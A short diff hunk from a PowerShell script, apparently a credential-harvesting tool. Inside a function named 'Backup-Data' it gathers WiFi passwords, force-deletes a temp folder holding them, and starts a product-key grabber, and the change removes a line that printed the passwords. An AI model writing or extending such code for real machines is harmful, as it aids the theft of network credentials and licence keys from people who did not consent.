@@ -401,7 +401,6 @@ function Backup-Data {
     }
     $wifipasswords = Get-WiFiInfo 
     ri "$env:tmp\wifi" -Recurse -Force
-    $wifipasswords
 
     function Get-ProductKey {
         try {
